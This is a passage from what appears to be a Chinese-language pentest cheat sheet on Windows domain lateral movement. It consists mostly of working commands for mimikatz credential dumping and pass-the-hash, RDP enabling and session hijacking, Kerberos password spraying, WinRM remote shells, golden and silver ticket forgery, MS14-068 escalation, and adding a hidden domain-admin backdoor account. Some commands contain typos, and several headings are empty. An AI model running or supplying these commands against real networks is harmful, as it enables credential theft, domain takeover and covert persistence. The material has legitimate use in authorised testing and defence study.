<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 域环境执行</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:top.pentest.top /ntlm:044dfa0c35b979ed369f7335b5ea20e0&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 工作组环境执行</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:administrator /domain:. /ntlm:044dfa0c35b979ed369f7335b5ea20e0&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="DCOM利用"><a href="#DCOM利用" class="headerlink" title="DCOM利用"></a>DCOM利用</h2><blockquote>
<p>使用DCOM在远程主机上面执行命令，需要具有以下条件:</p>
<ul>
<li><strong>具有管理员权限的PowerShell</strong></li>
<li><strong>可能需要关闭目标系统的防火墙。</strong></li>
<li><strong>在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户</strong></li>
</ul>
</blockquote>
<h2 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h2><blockquote>
<p>远程桌面协议（Remote Desktop Protocol，RDP）</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询主机是否开启了远程桌面（0=开启，1=禁用）</span></span><br><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections </span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启远程桌面 </span></span><br><span class="line">reg <span class="builtin-name">add</span> <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f </span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</span></span><br><span class="line">reg <span class="builtin-name">add</span> <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程桌面端口</span></span><br><span class="line">powershell -Command <span class="string">&quot;(Get-ItemProperty -Path &#x27;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#x27; -Name &#x27;PortNumber&#x27;).PortNumber&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置防火墙策略放行3389端口 </span></span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> rule <span class="attribute">name</span>=<span class="string">&quot;Remote Desktop&quot;</span> <span class="attribute">protocol</span>=TCP <span class="attribute">dir</span>=in <span class="attribute">localport</span>=3389 <span class="attribute">action</span>=allow</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于远程主机，可以通过WMI来开启远程桌面功能</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wmic</span> /Node:<span class="number">192.168.1.131</span> /User:uf<span class="number">9</span>n<span class="number">1</span>x\Administrator /Password:<span class="number">123</span>qwe@ RDTOGGLE WHRER ServerName=&#x27;win<span class="number">2008</span>&#x27; call SetAllowTSConnections <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="RDP-劫持"><a href="#RDP-劫持" class="headerlink" title="RDP 劫持"></a>RDP 劫持</h3><blockquote>
<p>Windows系统下，<strong>tscon</strong>可被用来切换远程桌面的会话</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有登录的用户列表得到id</span></span><br><span class="line">query user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再system权限下切换用户</span></span><br><span class="line">tscon &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<h3 id="sharpRDP"><a href="#sharpRDP" class="headerlink" title="sharpRDP"></a><a target="_blank" rel="noopener" href="https://github.com/0xthirteen/SharpRDP">sharpRDP</a></h3><blockquote>
<p>通过 RDP 执行经过身份验证的远程命令执行，而无需 GUI 客户端或 SOCKS 代理。</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常规RDP连接执行方式</span></span><br><span class="line">SharpRDP.exe <span class="attribute">computername</span>=target.domain <span class="attribute">command</span>=<span class="string">&quot;C:\Temp\file.exe&quot;</span> <span class="attribute">username</span>=domain\user <span class="attribute">password</span>=password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行程序作为cmd或者powershell的子程序</span></span><br><span class="line">SharpRDP.exe <span class="attribute">computername</span>=target.domain <span class="attribute">command</span>=<span class="string">&quot;C:\Temp\file.exe&quot;</span> <span class="attribute">username</span>=domain\user <span class="attribute">password</span>=password <span class="attribute">exec</span>=cmd</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Kerberos利用"><a href="#Kerberos利用" class="headerlink" title="Kerberos利用"></a>Kerberos利用</h2><h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute">Kerberos</a></p>
<p>相应速度快，而且没有日志</p>
</blockquote>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 对用户名列表进行验证</span></span><br><span class="line">kerbrute userenum -d <span class="params">&lt;Domain Name&gt;</span> --dc <span class="params">&lt;DC IP&gt;</span> <span class="params">&lt;Username Dict&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute">Kerberos</a></p>
<p>相应速度快，而且没有日志</p>
</blockquote>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 对用户名列表内所有用户使用一个密码登录。登录成功有日志产生</span></span><br><span class="line">kerbrute passwordspray -d <span class="params">&lt;Domain&gt;</span> --dc <span class="params">&lt;DC IP&gt;</span> <span class="params">&lt;Username Dict&gt;</span> <span class="params">&lt;Password&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Hash-爆破"><a href="#Hash-爆破" class="headerlink" title="Hash 爆破"></a>Hash 爆破</h3><blockquote>
<p>Hashcat</p>
<p>还是cmd5上面查快一点，爆破成功率太低</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="attribute">hashcat</span> -a <span class="number">0</span> -m <span class="number">5600</span> smbhash.txt pass.txt</span><br></pre></td></tr></table></figure>



<h2 id="WinRM利用"><a href="#WinRM利用" class="headerlink" title="WinRM利用"></a>WinRM利用</h2><blockquote>
<p><strong>只有在Windows Server 2008以上版本的服务器中，WinRm服务(5985端口)才会自动启动。</strong></p>
<p><strong>在利用WinRM进行横向移动时，需要拥有远程主机的</strong>管理员凭据信息<strong>。</strong></p>
</blockquote>
<blockquote>
<p>Windows远程管理提供了两个工具：<br>① Winrs，允许远程执行命令的命令行工具，利用了WS-Manage协议<br>② Winrm（Winrm.cmd)，内置系统管理命令行工具，允许管理员配置本机的WinRM服务。</p>
</blockquote>
<blockquote>
<p>在默认情况下，无法通过WinRM连接到目标系统。可能出现错误：Winrs error：WinRM客户端无法处理该请求。可以将默认身份验证与IP地址结合使用：<br>① 传输为HTTPS或目标位于TrustedHosts列表中，并且提供显式凭据<br>② 使用Winrm.cmd配置TrustedHosts。</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将目标地址添加到TrustedHosts中</span></span><br><span class="line">winrm <span class="builtin-name">set</span> winrm/config<span class="built_in">/client </span>@&#123;<span class="attribute">TrustedHosts</span>=<span class="string">&quot;192.168.1.1&quot;</span>&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过powershell，信任所有主机</span></span><br><span class="line">set-Item WSMan:localhost\client\trustedhosts -value *    </span><br></pre></td></tr></table></figure>

<blockquote>
<p>Winrs</p>
<p>Windows上远程管理提供的客户端程序，允许通过提供的用户凭据，在运行WinRM的服务器上执行命令。要求通信双方都安装了WinRM服务。</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 执行系统命令 </span><br><span class="line">winrs -r:http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>:<span class="number">5985</span> -u:Administrator -p:<span class="number">123</span>qwe@ &quot;whoami&quot; </span><br><span class="line"># 获取远程交互式命令行 </span><br><span class="line">winrs -r:http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>:<span class="number">5985</span> -u:Administrator -p:<span class="number">123</span>qwe@ &quot;<span class="built_in">cmd</span>&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Winrm.cmd</p>
<p>允许WMI对象通过WinRm传输进行远程交互，在本地或远程计算机上枚举WMI对象实例或调用WMI类方法。比如可以通过调用Win32_Process类的Create方法来创建远程实例。</p>
</blockquote>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm<span class="built_in"> invoke </span>create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=<span class="string">&quot;notepad.exe&quot;</span>&#125; -r:http://192.168.1.131:5985 -u:Administrator -p:123qwe@</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">Evil-Winrm</a></p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo gem install winrm winrm-fs stringio logger fileutils</span><br><span class="line"><span class="comment"># 克隆存储库</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Hackplayers/</span>evil-winrm.git</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">cd evil-winrm &amp;&amp; ruby evil-winrm.rb -i <span class="number">192.168</span>.<span class="number">1.100</span> -u Administrator -p <span class="string">&#x27;MySuperSecr3tPass123!&#x27;</span> -s <span class="string">&#x27;/home/foo/ps1_scripts/&#x27;</span> -e <span class="string">&#x27;/home/foo/exe_files/&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="PTH-amp-PTK-amp-PTT"><a href="#PTH-amp-PTK-amp-PTT" class="headerlink" title="PTH&amp;PTK&amp;PTT"></a>PTH&amp;PTK&amp;PTT</h2><h3 id="哈希传递-PTH"><a href="#哈希传递-PTH" class="headerlink" title="哈希传递(PTH)"></a>哈希传递(PTH)</h3><blockquote>
<p>是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码</p>
</blockquote>
<blockquote>
<p>前提条件</p>
</blockquote>
<ul>
<li>工作组/域环境</li>
<li>获得了Administrator账号hash，但不能爆破或者爆破难度大</li>
<li>内网中存在和当前机器相同的密码</li>
<li>打了pth补丁以后，唯独<code>Administrator(SID 500)</code>账号可以使用PTH远程IPC连接</li>
</ul>
<blockquote>
<p>限制条件</p>
</blockquote>
<ul>
<li>执行需要管理员权限的操作会受 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction">Remote UAC</a>  限制。</li>
<li>启用了<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/7c705718-f58e-4886-8057-37c8fd9aede1">FilterAdministratorToken</a>，任何管理员账户都不行，域用户可以。</li>
<li>KB2871997 补丁，组策略限制了远程认证，获取不到凭证。</li>
</ul>
<h4 id="常见利用方式"><a href="#常见利用方式" class="headerlink" title="常见利用方式"></a>常见利用方式</h4><blockquote>
<p>利用<code>WMI</code>实现PTH(wmic、wmiexec(.py、.exe、.vbs)、sharpwmi、Sharp-WMIEvent、wmihacker、Invoke-TheHash、mimikatz)</p>
<p>利用<code>SMB</code>实现PTH(psexec、smbexec、smbclient、CrackMapExec、mimikatz)</p>
<p>利用<code>RPC</code>实现PTH(rpcdump.py、pth-rpcclient、PTH-net)</p>
<p>atexec、kekeo、pth-winexe、Metasploit</p>
</blockquote>
<h3 id="秘钥传递-PTK"><a href="#秘钥传递-PTK" class="headerlink" title="秘钥传递(PTK)"></a>秘钥传递(PTK)</h3><blockquote>
<p>利用的<strong>ekeys aes256</strong>进行的渗透测试</p>
<p>打补丁前不能连接，打补丁后才能任意用户都可以连接</p>
</blockquote>
<blockquote>
<p><strong>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功</strong>。对于 8.1/2012r2，安装补丁 <strong>kb2871997</strong> 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击</p>
</blockquote>
<h3 id="票据传递-PTT"><a href="#票据传递-PTT" class="headerlink" title="票据传递(PTT)"></a>票据传递(PTT)</h3><blockquote>
<p>利用的<strong>票据凭证TGT</strong>进行的渗透测试</p>
</blockquote>
<h4 id="黄金票据-Golden-ticket"><a href="#黄金票据-Golden-ticket" class="headerlink" title="黄金票据(Golden ticket)"></a>黄金票据(Golden ticket)</h4><blockquote>
<p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个<br>Logon Session Key(登陆会话密钥)和TGT(票据授权票据),而Logon Session Key并不会保存在KDC(密钥分发中心)中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
<p>黄金票据就是伪造（TGT）=票据授权票据</p>
<p>可以获取任意身份认证权限</p>
<p>黄金票据同KDC(密钥分发中心)交互，但不同AS(票据授权票据生成服务)交互</p>
<p>黄金票据采用Kerberos(身份认证协议)NTML Hash 加密</p>
</blockquote>
<blockquote>
<p>所需条件</p>
</blockquote>
<ul>
<li>域的权限是大前提</li>
<li>域名称</li>
<li>域<code>SID</code>值</li>
<li>域的<code>KRBTGT</code>账号的<code>HASH</code></li>
<li>需要伪造的任意用户名</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 获取域的SID值</span><br><span class="line">whoami /user</span><br><span class="line"></span><br><span class="line"># 查看所在域</span><br><span class="line"><span class="built_in">net</span> config workstation </span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用<code>mimikatz</code>获取用户<code>hash</code></p>
</blockquote>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行mimikatz.exe</span></span><br><span class="line"><span class="class">privilegeg::debug</span>       <span class="comment">#开启特权模式</span></span><br><span class="line"><span class="class">lsadump::lsa</span> /patch     <span class="comment">#获取用户hash，域的hash</span></span><br><span class="line"><span class="class">lsadump::lsa</span> /patch /<span class="literal">user</span>:krbtgt <span class="comment"># 获取krbtgt用户hash,域的sid</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>制作黄金票据</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 清除机器中的票据，以防干扰</span><br><span class="line"><span class="function">Kerberos::<span class="title">purge</span></span></span><br><span class="line"><span class="function"><span class="title">klist</span> <span class="title">purge</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 制作黄金票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">user:administrator</span> /<span class="title">domain:cyber</span>.<span class="title">com</span> /<span class="title">sid:S</span>-1-5-21-1923088019-4105411894-1236499359 /<span class="title">krbtgt:d40f0e3b1347e55dbfd6dc58e80a3b6e</span> /<span class="title">ticket:ticket</span>.<span class="title">kirbi</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 格式</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">user:XXX</span>任意用户名 /<span class="title">domain</span>:域名 /<span class="title">sid</span>:域的<span class="title">sid</span>值 /<span class="title">ticket:XXX</span>.<span class="title">kirbi</span>(生成的票据名称)</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>票据传递</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">kerberos::<span class="title">ptt</span> <span class="title">ticket.kirbi</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>开始利用</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 列出C卷</span><br><span class="line"><span class="built_in">dir</span> \\dc.cyber.com\c$</span><br><span class="line"></span><br><span class="line"># 执行命令</span><br><span class="line">PsExec64.exe \\dc.cyber.com -s <span class="built_in">cmd</span>.exe</span><br><span class="line"></span><br><span class="line"># 在域内创建隐藏用户。</span><br><span class="line"><span class="built_in">net</span> user qwerty$ Aa123456 /add /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; qwerty$ /domain</span><br></pre></td></tr></table></figure>



<h4 id="白银票据-Silver-ticket"><a href="#白银票据-Silver-ticket" class="headerlink" title="白银票据(Silver ticket)"></a>白银票据(Silver ticket)</h4><blockquote>
<p>白银票据就是伪造（ST）=服务票据</p>
<p>白银票据只能访问指定的服务(LDAP、WMI、MSSQL、WinRM、DNS、CIFS)</p>
<p>白银票据不同KDC(密钥分发中心)交互，直接访问Server服务</p>
<p>白银票据由服务账号 NTML Hash 加密</p>
</blockquote>
<blockquote>
<p>所需条件</p>
</blockquote>
<ul>
<li><code>域名称</code></li>
<li>域<code>SID</code></li>
<li>目标<code>服务器名</code></li>
<li><code>可利用的服务</code></li>
<li><code>服务账号</code>的<code>NTML Hash</code></li>
<li>需要<code>伪造的用户名</code></li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 获取域的SID值</span><br><span class="line">whoami /user</span><br><span class="line"></span><br><span class="line"># 查看所在域</span><br><span class="line"><span class="built_in">net</span> config workstation </span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用<code>mimikatz.exe</code>获取服务账号的hash</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; &gt; &#x27;xxx.txt&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>制作白银票据</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 清除机器中的票据，以防干扰</span><br><span class="line"><span class="function">Kerberos::<span class="title">purge</span></span></span><br><span class="line"><span class="function"><span class="title">klist</span> <span class="title">purge</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 制作白银票据</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain:cyber</span>.<span class="title">com</span> /<span class="title">sid:S</span>-1-5-21-1923088019-4105411894-1236499359 /<span class="title">target:dc</span>.<span class="title">cyber.com</span> /<span class="title">service:cifs</span> /<span class="title">rc4</span>:45<span class="title">bdd23a3b9fc1c44a9fbb4081a70b30</span> /<span class="title">user:aaaa</span> /<span class="title">ptt</span></span></span><br><span class="line"><span class="function"># 格式</span></span><br><span class="line"><span class="function"><span class="title">kerberos</span>::<span class="title">golden</span> /<span class="title">domain</span>:域名 /<span class="title">sid</span>:域<span class="title">sid</span> /<span class="title">target</span>:目标服务器 /<span class="title">service</span>:目标服务 /<span class="title">rc4</span>:目标服务器的<span class="title">hash</span> /<span class="title">user:xxx</span>用户名 /<span class="title">ptt</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>开始利用</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 列出C卷</span><br><span class="line"><span class="built_in">dir</span> \\dc.cyber.com\c$</span><br></pre></td></tr></table></figure>

<h4 id="黄金票据和白银票据的区别"><a href="#黄金票据和白银票据的区别" class="headerlink" title="黄金票据和白银票据的区别"></a>黄金票据和白银票据的区别</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">金票和银票的区别</span><br><span class="line">获取的权限不同</span><br><span class="line">金票：伪造的TGT，可以获取任意Kerberos的访问权限</span><br><span class="line">银票：伪造的ST，只能访问指定的服务，如CIFS</span><br><span class="line"></span><br><span class="line">认证流程不同</span><br><span class="line">金票：同KDC交互，但不同AS交互</span><br><span class="line">银票：不同KDC交互，直接访问Server</span><br><span class="line"></span><br><span class="line">加密方式不同</span><br><span class="line">金票：由krbtgt NTLM <span class="keyword">Hash</span> 加密</span><br><span class="line">银票：由服务账号 NTLM <span class="keyword">Hash</span> 加密</span><br></pre></td></tr></table></figure>



<h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><blockquote>
<p>MS14-068可以将普通域用户提升到域管理员权限</p>
</blockquote>
<blockquote>
<p>前提条件</p>
</blockquote>
<ul>
<li>域<code>用户名密码</code></li>
<li><code>域SID</code></li>
<li>系统补丁不存在<code>KB3011780</code></li>
</ul>
<blockquote>
<p>查看补丁安装情况</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo|<span class="built_in">find</span> &quot;KB3011780&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>获取域SID</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>

<blockquote>
<p>获取域IP</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span>、<span class="built_in">ping</span>获取</span><br><span class="line"><span class="built_in">ping</span> dc.cyber.com</span><br><span class="line"># <span class="number">2</span>、nslookup获取</span><br><span class="line">nslookup/<span class="built_in">ping</span> dc.cyber.com</span><br><span class="line"># <span class="number">3</span>、nltest获取</span><br><span class="line">nltest /DCLIST:dc.cyber.com</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Ms-16-068利用</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`ms14-<span class="number">068</span>.exe -u user@domain -p user_password -s sid -d domain_ip`</span><br><span class="line"></span><br><span class="line"># 格式</span><br><span class="line">ms14-<span class="number">068</span>.exe -u hack1@cyber.com -p Aa123456 -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1923088019</span>-<span class="number">4105411894</span>-<span class="number">1236499359</span>-<span class="number">1115</span> -d <span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>

<h4 id="CVE-2021-42278"><a href="#CVE-2021-42278" class="headerlink" title="CVE-2021-42278"></a>CVE-2021-42278</h4><h4 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h4><h4 id="CVE-2021-42288"><a href="#CVE-2021-42288" class="headerlink" title="CVE-2021-42288"></a>CVE-2021-42288</h4><h4 id="Kerberos委派-1"><a href="#Kerberos委派-1" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h4><blockquote>
<p>非约束委派、约束委派，资源委派</p>
</blockquote>
<h4 id="NTML"><a href="#NTML" class="headerlink" title="NTML"></a>NTML</h4><blockquote>
<p>Windows Server 2003 及其以下系统用<code>LM Hash</code>，以上系统用 <code>NT Hash</code></p>
<p>从LM Hash转换为NT Hash主要是因为前者更容易被彩虹表破解，目前主流事NTLMv2</p>
</blockquote>
<blockquote>
<p>NTML的认证过程</p>
</blockquote>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 协商</span></span><br><span class="line">客户端在本地缓存服务器密码的NTLM Hash值，并向服务端发送协商认证(用户名，机器，协议，加密等安全信息)</span><br><span class="line"></span><br><span class="line"><span class="meta"># 质询</span></span><br><span class="line">服务端获取到质询认证以后将自己能够解析的信息进行提取，再本地保存一份该信息的随机值，同时返还给客户端</span><br><span class="line">客户端收到服务端支持的内容后将密码的HTLM Hash对该随机值加密，并于用户名，随机值等认证信息组合发送到服务端</span><br><span class="line"></span><br><span class="line"><span class="meta"># 身份验证</span></span><br><span class="line">服务端收到该认证消息以后也会用密码的HTLM Hash对该随机值加密，组成认证信息进行比对，匹配则通过认证。</span><br></pre></td></tr></table></figure>

<h4 id="NTML-1"><a href="#NTML-1" class="headerlink" title="NTML"></a>NTML</h4><h4 id="NTLM-Replay-NTML中继"><a href="#NTLM-Replay-NTML中继" class="headerlink" title="NTLM Replay(NTML中继)"></a>NTLM Replay(NTML中继)</h4><blockquote>
<p>NTLM 中继是中间人攻击，当受害主动访问中间人服务器，转发受害人 NTLM 认证每一步到目标服务器完成认证，从而中间人服务器获得目标服务器的权限。</p>
<p>还要捕获NTML hash ，谁知道什么时候会来认证服务，太靠运气，太耗时间</p>
</blockquote>
<h5 id="捕获-NTLM-哈希"><a href="#捕获-NTLM-哈希" class="headerlink" title="捕获 NTLM 哈希"></a>捕获 NTLM 哈希</h5><h6 id="协议欺骗"><a href="#协议欺骗" class="headerlink" title="协议欺骗"></a>协议欺骗</h6><blockquote>
<p>使用 LLMNR、MDNS、NBT-NS 欺骗</p>
<p>当受害者访问一个不存在的名称时，自动被欺骗访问中间人服务器，就会收到哈希去转发利用</p>
</blockquote>
<h6 id="强制认证"><a href="#强制认证" class="headerlink" title="强制认证"></a>强制认证</h6><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/p0dalirius/Coercer">Coercer</a></p>
<p>Coercer 是一款集成多种方法对目标服务器进行强制验证的python脚本</p>
</blockquote>
